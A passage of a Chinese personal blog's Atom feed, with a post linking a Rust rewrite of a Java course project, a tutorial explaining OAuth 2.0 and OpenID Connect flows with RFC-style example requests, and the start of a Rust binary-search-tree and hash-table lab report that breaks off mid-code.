    <category term="排序" scheme="https://aucept.in/tags/%E6%8E%92%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>锈化的大作业</title>
    <link href="https://aucept.in/2025/12/16/%E9%94%88%E5%8C%96%E7%9A%84%E5%A4%A7%E4%BD%9C%E4%B8%9A/"/>
    <id>https://aucept.in/2025/12/16/%E9%94%88%E5%8C%96%E7%9A%84%E5%A4%A7%E4%BD%9C%E4%B8%9A/</id>
    <published>2025-12-16T04:11:59.000Z</published>
    <updated>2025-12-23T13:18:41.085Z</updated>
    
    <content type="html"><![CDATA[<p>如题，其实是java的大作业，但是锈化版，只是熟悉各种常用依赖</p>
<p><a href="https://github.com/AuceptinFang/rusty_java_final_lab.git">https://github.com/AuceptinFang/rusty_java_final_lab.git</a></p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;如题，其实是java的大作业，但是锈化版，只是熟悉各种常用依赖&lt;/p&gt;
&lt;p&gt;&lt;a</summary>
        
      
    
    
    
    <category term="从0开始的rust之旅" scheme="https://aucept.in/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84rust%E4%B9%8B%E6%97%85/"/>
    
    
    <category term="rust" scheme="https://aucept.in/tags/rust/"/>
    
  </entry>
  
  <entry>
    <title>OAuth 2.0 与 OIDC</title>
    <link href="https://aucept.in/2025/12/12/Oauth2-%E4%B8%8E-OIDC/"/>
    <id>https://aucept.in/2025/12/12/Oauth2-%E4%B8%8E-OIDC/</id>
    <published>2025-12-12T11:31:14.000Z</published>
    <updated>2025-12-13T12:47:45.875Z</updated>
    
    <content type="html"><![CDATA[<p>最近写的程序涉及到了OAuth2.0 和 OIDC，遂仔细理解一下这两个协议</p>
<p>OIDC是OAuth的拓展，所以先从OAuth开始，<a href="https://datatracker.ietf.org/doc/html/rfc6749">参考文档</a></p>
<h2 id="OAuth-2-0"><a href="#OAuth-2-0" class="headerlink" title="OAuth 2.0"></a>OAuth 2.0</h2><h3 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h3><p>Open Authorization，开放式授权，要解决的核心问题是“在不获取另一应用的密码的情况下，访问到另一应用里受保护的资源”，比如很多app/网站都支持微信登录，然而他们并不需要知道你的微信密码</p>
<p>那么如何实现呢？直接共享密码相当于完全暴露隐私，显然是不可取的，部分应用使用api key，这样一个key对应一个服务，虽然实现了受限访问，但key和密码本质上也没啥区别</p>
<p>于是OAuth应运而生，其核心是使用访问令牌（access token）——一个包含权限范围、持续时长与其他访问属性的字符串。认证服务器在得到用户的批准后将token颁发给第三方应用，这个第三方用这个token就可以访问到受保护的资源</p>
<h3 id="四个角色"><a href="#四个角色" class="headerlink" title="四个角色"></a>四个角色</h3><p>为了说明更加清晰，OAuth定义了四个角色：</p>
<ul>
<li>resource owner，资源拥有者，一般来说就是用户</li>
<li>resource server 资源服务器，资源实际存放的地方</li>
<li>client 客户端，也就是要用资源的第三方应用</li>
<li>authorization server 进行身份认证和颁发token的服务器</li>
</ul>
<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">+--------+                               +---------------+
|        |--(A)- Authorization Request ->|   Resource    |
|        |                               |     Owner     |
|        |&lt;-(B)-- Authorization Grant ---|               |
|        |                               +---------------+
|        |
|        |                               +---------------+
|        |--(C)-- Authorization Grant -->| Authorization |
| Client |                               |     Server    |
|        |&lt;-(D)----- Access Token -------|               |
|        |                               +---------------+
|        |
|        |                               +---------------+
|        |--(E)----- Access Token ------>|    Resource   |
|        |                               |     Server    |
|        |&lt;-(F)--- Protected Resource ---|               |
+--------+                               +---------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>简单说就是，客户端向你请求进行认证，你完成认证，客户端再去授权服务器，认证成功得到token，再拿着token去资源服务器拿东西</p>
<p>展开的话，对于向用户发起请求，更建议的（称为标准的）方式是通过授权服务器作为中介来间接发出，也就是重定向到认证服务器去认证，通过url设置返回地址再回来。直白的说，直接方式是问你用户名密码权限，间接方式是把你送到认证服务器输入密码。所以直接方式还要OAuth干什么？</p>
<p>然后认证成功，客户端得到授权凭证（Authorization Grant），这有四种形式：</p>
<ul>
<li>Authorization Code，其中最常用最安全的，重定向到授权服务器完成身份验证，完成后获得code</li>
<li>implicit, 前者的简化，认证成功后直接授予token省略中介材料，有安全风险，已经被 带有 PKCE（Proof Key for Code Exchange）的授权码模式所取代</li>
<li>resource owner password credentials 直接授予密码，仅限于客户端和资源服务器是同一家时可用</li>
<li>client credentials 一种机器对机器(M2M)的场景，无用户参与，即直接从C环节开始，客户端已有授权服务器信任的id和秘钥，服务器在验证之后直接颁发token</li>
</ul>
<p>客户端向认证服务器呈递凭证，验证合法后颁发token</p>
<p>客户端向资源服务器呈递token，同样验证有效后回应请求</p>
<h3 id="Access-Token-与-Refresh-Token"><a href="#Access-Token-与-Refresh-Token" class="headerlink" title="Access Token 与 Refresh Token"></a>Access Token 与 Refresh Token</h3><p>Access Token 一个字符串，包含权限等信息，一般来说对客户端不透明（看不懂）</p>
<p>在获得Access token的同时，一般也会同时获得Refresh Token。前者的过期时间很短，如果每五分钟验证一次身份太过影响使用体验，所以又产生了过期慢得多的Refresh Token</p>
<p>客户端可以在access token验证无效（过期）后用Refresh Token找授权服务器换取新的</p>
<h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>作为流程的第一环，只有受信任的客户端才能开始整个流程，所以在授权开始前，客户端需要去授权服务器注册，如何注册不在本协议范畴，但是重点是获得需要的属性:</p>
<ul>
<li>id &amp;&amp; secret : 客户端的标识符，密码不可外泄</li>
<li>type: public or Confidential，比如web应用的后端在独立的服务器上，数据可以保证不外泄，所以是机密的；而手机app的后端数据就在本地，就是公开的，需要考虑客户端可能伪造</li>
<li>redirect_url : 授权码得到后只能被重定向到唯一合法地址，保证授权码不会外泄</li>
</ul>
<h3 id="三个Endpoint"><a href="#三个Endpoint" class="headerlink" title="三个Endpoint"></a>三个Endpoint</h3><p>OAuth 2.0 的授权过程主要涉及三个网络地址（Endpoint）</p>
<h4 id="Authorization-Endpoint-授权端点"><a href="#Authorization-Endpoint-授权端点" class="headerlink" title="Authorization Endpoint (授权端点)"></a>Authorization Endpoint (授权端点)</h4><p>授权服务器的地址，客户端将资源拥有者重定向到这里完成第一步的认证</p>
<h4 id="Token-Endpoint-令牌端点"><a href="#Token-Endpoint-令牌端点" class="headerlink" title="Token Endpoint (令牌端点)"></a>Token Endpoint (令牌端点)</h4><p>授权服务器的另一个地址，客户端从这里用授权码换取token</p>
<h4 id="Redirection-Endpoint-重定向端点"><a href="#Redirection-Endpoint-重定向端点" class="headerlink" title="Redirection Endpoint (重定向端点)"></a>Redirection Endpoint (重定向端点)</h4><p>客户端的地址，授权服务器会将授权码通过重定向发送到这里，也就是刚才客户端注册时的redirect_url</p>
<h3 id="授权码模式详解"><a href="#授权码模式详解" class="headerlink" title="授权码模式详解"></a>授权码模式详解</h3><h4 id="Authorization-Request"><a href="#Authorization-Request" class="headerlink" title="Authorization Request"></a>Authorization Request</h4><p>GET /authorize?response_type=code&amp;client_id=s6BhdRkqt3&amp;state=xyz<br>&amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1<br>Host: server.example.com</p>
<p>指明response_type为授权码模式；客户端id；推荐带有state字段，一个随机字符串，用来防范跨站请求伪造（CSRF）攻击；重定向uri；权限scope（optional）</p>
<h4 id="Authorization-Response"><a href="#Authorization-Response" class="headerlink" title="Authorization Response"></a>Authorization Response</h4><pre class="line-numbers language-text" data-language="text"><code class="language-text">HTTP/1.1 302 Found
Location: https://client.example.com/cb?code=SplxlOBeZQQYbYS6WxSbIA&amp;state=xyz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>在验证通过后，回应302重定向到刚才的redirect_uri，附带code，和state（如果有）</p>
<h4 id="Error-Response"><a href="#Error-Response" class="headerlink" title="Error Response"></a>Error Response</h4><p>对于错误处理，有两种情况。如果错误在redirect_uri和client_id，那么就无法证明客户端的身份，是最危险的情况所以不跳转展示错误信息</p>
<p>如果是其余错误，则携带错误信息返回，包括:</p>
<ul>
<li>invalid_request: 缺少参数、格式错误、重复参数、未知参数等</li>
<li>unauthorized_client: 客户端未被授权（如public类型的不能使用授权码模式）</li>
<li>access_denied: 资源拥有者或授权服务器拒绝了请求（用户没有完成认证）</li>
<li>unsupported_response_type: 授权服务器不支持</li>
<li>invalid_scope: scope非法、未知或格式错误</li>
<li>server_error: 授权服务器错误</li>
<li>temporarily_unavailable: 授权服务器错误</li>
</ul>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">HTTP/1.1 302 Found
Location: https://client.example.com/cb?error=access_denied&amp;state=xyz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>error_description和error_uri可选</p>
<h4 id="Access-Token-Request"><a href="#Access-Token-Request" class="headerlink" title="Access Token Request"></a>Access Token Request</h4><pre class="line-numbers language-text" data-language="text"><code class="language-text">POST /token HTTP/1.1
Host: server.example.com
Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&amp;code=SplxlOBeZQQYbYS6WxSbIA
&amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>grant_type必须为authorization_code；授权码code；redirect_uri，必须和之前的一致；client id</p>
<h4 id="Access-Token-Response"><a href="#Access-Token-Response" class="headerlink" title="Access Token Response"></a>Access Token Response</h4><pre class="line-numbers language-text" data-language="text"><code class="language-text">HTTP/1.1 200 OK
Content-Type: application/json;charset=UTF-8
Cache-Control: no-store
Pragma: no-cache

&#123;
"access_token":"2YotnFZFEjr1zCsicMWpAA",
"token_type":"example",
"expires_in":3600,
"refresh_token":"tGzv3JOkF0XG5Qx2TlKWIA",
"example_parameter":"example_value"
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>包含两个token，过期时间（秒），token类型，scope</p>
<p>同样，错误处理：<br><pre class="line-numbers language-text" data-language="text"><code class="language-text">HTTP/1.1 400 Bad Request
Content-Type: application/json;charset=UTF-8
Cache-Control: no-store
Pragma: no-cache

&#123;
"error":"invalid_request"
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h4 id="Refreshing-an-Access-Token"><a href="#Refreshing-an-Access-Token" class="headerlink" title="Refreshing an Access Token"></a>Refreshing an Access Token</h4><pre class="line-numbers language-text" data-language="text"><code class="language-text">POST /token HTTP/1.1
Host: server.example.com
Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW
Content-Type: application/x-www-form-urlencoded

grant_type=refresh_token&amp;refresh_token=tGzv3JOkF0XG5Qx2TlKWIA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>grant_type必须为refresh_token，scope可选</p>
<h4 id="Accessing-Protected-Resources"><a href="#Accessing-Protected-Resources" class="headerlink" title="Accessing Protected Resources"></a>Accessing Protected Resources</h4><p>出示令牌的方式取决于刚才的token_type，分为两类，Bearer和MAC</p>
<p>前者是绝对的主流方式，Authorization: Bearer [Access Token]即可，MAC需要客户端用token进行签名，极少使用</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">GET /resource/1 HTTP/1.1
Host: example.com
Authorization: Bearer mF_9.B5f-4.1JqM<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">GET /resource/1 HTTP/1.1
Host: example.com
Authorization: MAC id="h480djs93hd8",
                nonce="274312:dj83hs9s",
                mac="kDZvddkndxvhGRXZhvuDjEWhGeE="<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="OIDC"><a href="#OIDC" class="headerlink" title="OIDC"></a>OIDC</h2><p>OAuth 2.0的流程基本清晰了，接下来是OIDC(OpenID Connect)，<a href="https://openid.net/developers/how-connect-works/">官网文档</a> 和 <a href="https://blog.logto.io/zh-CN/what-is-oidc">logto提供的资料</a></p>
<p>OIDC 是基于 OAuth 2.0 协议之上的简单身份层（Identity Layer）</p>
<p>OAuth 2.0 负责 授权 (Authorization)：即“允许这个应用代替我去拿数据”，OIDC 负责认证 (Authentication)：即“证明这个用户是谁”</p>
<p>access token像一把钥匙，拿到就可以获取对应的信息，而OIDC则多带上了身份证，意味着可以根据身份获取不同的“资源”</p>
<h3 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h3><p>OIDC引入了三个角色：</p>
<ul>
<li>终端用户 (End User): 最终用户，对应 OAuth 2.0 的资源所有者</li>
<li>依赖方 (RP): 依赖方，对应 OAuth 2.0 的客户端</li>
<li>OpenID 提供者 (OP): 身份认证服务提供者，对应 OAuth 2.0 的授权服务器和资源服务器</li>
</ul>
<p>在OAuth 2.0的基础上，OIDC的流程只有很微小的变化：</p>
<ul>
<li>在第一步重定向发起授权请求时，必须包含 scope=openid</li>
<li>在获取access token的同时还会得到一个带有个人身份信息的ID Token</li>
</ul>
<h3 id="ID-token"><a href="#ID-token" class="headerlink" title="ID token"></a>ID token</h3><p>一个 JWT (JSON Web Token) 格式的字符串，包含以下必要信息：</p>
<ul>
<li>sub (Subject)最重要的，用户的唯一 ID    </li>
<li>iss (Issuer)签发者，即授权服务器</li>
<li>aud (Audience) 受众，客户端（依赖方）</li>
<li>exp (Expiration Time) 过期时间</li>
<li>iat (Issued At) 签发时间</li>
</ul>
<p>ID token是给客户端RP看的，可以将access token和用户身份绑定于是避免了“混淆代理人攻击” (Confused Deputy Problem)</p>
<p>单纯的access token不含有用户信息，所以即使只是想知道用户的id也许要再进行一次查询</p>
<p>access token还有过期，而只要id token没过期就不用重新进行身份验证，</p>
<h3 id="userinfo-endpoint"><a href="#userinfo-endpoint" class="headerlink" title="userinfo-endpoint"></a>userinfo-endpoint</h3><p>用户信息端点，OP提供的标准化 HTTP API 用于获取经过身份验证的用户详细信息，通过使用访问令牌向该端点发送 GET 或 POST 请求，可以接收到 JSON 格式的用户信息。 </p>
<p>ID token里能承载的信息有限，所以定义了这样一个接口获取详细全部信息，按协议在OP_url/userinfo这个路径下，按照协议规范，客户端应通过访问 Discovery Endpoint（路径为 OP_url/.well-known/openid-configuration）来获取服务元数据。在该元数据 JSON 中，userinfo_endpoint即是准确url</p>
<h3 id="Discovery-Endpoint"><a href="#Discovery-Endpoint" class="headerlink" title="Discovery Endpoint"></a>Discovery Endpoint</h3><p><a href="https://openid.net/specs/openid-connect-discovery-1_0.html#ProviderMetadata">详细文档</a></p>
<p>元数据文档里的重要数据字段：</p>
<ul>
<li>issuer: The unique identifier of the OpenID Provider. It should be used for validating the tokens.</li>
<li>authorization_endpoint: The URL to initiate the  Authentication request .</li>
<li>token_endpoint: The URL to send the  Token request .</li>
<li>jwks_uri: The URL to retrieve the  JSON Web Key Set (JWKS) for  Signing key validation.</li>
<li>response_types_supported: The supported response types for the  Authentication request .</li>
<li>scopes_supported: The supported  scopes for the  Authentication request .</li>
<li>claims_supported: The supported  claims for the  ID token .</li>
<li>token_endpoint_auth_methods_supported: The supported client authentication methods for the  Token request .</li>
</ul>
<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>OIDC是现代身份管理系统的底层技术，它有更多的使用场景：</p>
<ul>
<li>单点登录 (SSO) OP 统一管理用户的登录状态（Session）。一旦在一个应用登录，其他应用（RP）就可以直接通过 OIDC 拿到 ID Token，无需再次输入密码.用户只需登录一次，即可访问所有关联应用，提高效率。</li>
<li>组织结构管理 OP返回的信息中可以包含组织职位等信息</li>
<li>权限管理 </li>
</ul>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;最近写的程序涉及到了OAuth2.0 和 OIDC，遂仔细理解一下这两个协议&lt;/p&gt;
&lt;p&gt;OIDC是OAuth的拓展，所以先从OAuth开始，&lt;a</summary>
        
      
    
    
    
    <category term="学习生活" scheme="https://aucept.in/categories/%E5%AD%A6%E4%B9%A0%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="OAuth 2.0" scheme="https://aucept.in/tags/OAuth-2-0/"/>
    
    <category term="OIDC" scheme="https://aucept.in/tags/OIDC/"/>
    
  </entry>
  
  <entry>
    <title>数据结构-二叉搜索树与哈希表实验</title>
    <link href="https://aucept.in/2025/12/12/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E4%B8%8E%E5%93%88%E5%B8%8C%E8%A1%A8%E5%AE%9E%E9%AA%8C/"/>
    <id>https://aucept.in/2025/12/12/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E4%B8%8E%E5%93%88%E5%B8%8C%E8%A1%A8%E5%AE%9E%E9%AA%8C/</id>
    <published>2025-12-12T08:14:41.000Z</published>
    <updated>2025-12-13T12:35:25.118Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">（一）：二叉排序树
- 问题：从键盘输入数据建立二叉排序树，实现查找、遍历和格式化打印
- 要求：建立BST，实现查找（成功/不成功），计算查找长度
- 测试：自行设计测试数据，注意边界情况

（二）：哈希表设计
- 问题：为30个中文拼音人名设计哈希表，平均查找长度≤2
- 要求：使用除留余数法构造哈希函数，可选线性探测、再散列或链地址法处理冲突
- 测试：使用熟悉的30个人名作为数据

（三）：实现二叉排序树的插入和删除功能

（四）：从教科书上介绍的哈希函数构造方法中选出适用者并设计几个不同的哈希函数，
比较他们的地址冲突率（可以用更大的名字集合作实验）。

（五）：研究必做实验（2）的30个人名的特点，努力找一个哈希函数，
使得对于不同的拼音名一定不发生地址冲突。

（六）：在哈希函数确定的前提下尝试各种不同处理冲突的方法，
考察平均查找长度的变化和造好的哈希表中关键字的聚集性。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="二叉排序树"><a href="#二叉排序树" class="headerlink" title="二叉排序树"></a>二叉排序树</h2><p>数据结构可以照搬之前的二叉树，这里做了微调：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">anyhow<span class="token punctuation">::</span></span><span class="token punctuation">&#123;</span><span class="token class-name">Context</span><span class="token punctuation">,</span> <span class="token class-name">Result</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token type-definition class-name">SearchTree</span><span class="token punctuation">&#123;</span>
    root <span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token class-name">Node</span><span class="token operator">>></span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">struct</span> <span class="token type-definition class-name">Node</span><span class="token punctuation">&#123;</span>
    value <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">,</span>
    left <span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token class-name">Node</span><span class="token operator">>></span><span class="token punctuation">,</span>
    right <span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token class-name">Node</span><span class="token operator">>></span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">impl</span> <span class="token class-name">SearchTree</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">new</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">SearchTree</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">SearchTree</span><span class="token punctuation">&#123;</span>
            root <span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">fn</span> <span class="token function-definition function">insert</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> value <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>root<span class="token punctuation">.</span><span class="token function">is_none</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span>root <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">Node</span><span class="token punctuation">&#123;</span>value <span class="token punctuation">:</span> value<span class="token punctuation">,</span> left <span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span> right <span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token keyword">ref</span> <span class="token keyword">mut</span> node<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>root <span class="token punctuation">&#123;</span>
                node<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">fn</span> <span class="token function-definition function">build</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> values <span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">for</span> v <span class="token keyword">in</span> values <span class="token punctuation">&#123;</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">fn</span> <span class="token function-definition function">search</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> value <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>root<span class="token punctuation">.</span><span class="token function">is_none</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token class-name">Option</span><span class="token punctuation">::</span><span class="token class-name">None</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">let</span> root <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>root<span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">let</span> <span class="token punctuation">(</span>result<span class="token punctuation">,</span> depth <span class="token punctuation">)</span><span class="token operator">=</span> root<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"查找次数: &#123;&#125;"</span><span class="token punctuation">,</span>depth <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            result
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">fn</span> <span class="token function-definition function">print</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>root<span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            root<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 默认使用中序遍历了</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">traverse</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>root<span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            root<span class="token punctuation">.</span><span class="token function">in_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">fn</span> <span class="token function-definition function">delete</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> value <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>root<span class="token punctuation">.</span><span class="token function">is_some</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span>root <span class="token operator">=</span> <span class="token class-name">Node</span><span class="token punctuation">::</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>root<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token namespace">anyhow<span class="token punctuation">::</span></span><span class="token macro property">bail!</span><span class="token punctuation">(</span><span class="token string">"根节点为空"</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span>

    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">impl</span> <span class="token class-name">Node</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">insert</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> value <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> value <span class="token operator">==</span> <span class="token keyword">self</span><span class="token punctuation">.</span>value <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> value <span class="token operator">></span> <span class="token keyword">self</span><span class="token punctuation">.</span>value <span class="token punctuation">&#123;</span>
            <span class="token keyword">match</span> <span class="token keyword">self</span><span class="token punctuation">.</span>right<span class="token punctuation">&#123;</span>
                <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token keyword">ref</span> <span class="token keyword">mut</span> node<span class="token punctuation">)</span> <span class="token operator">=></span> node<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">,</span>
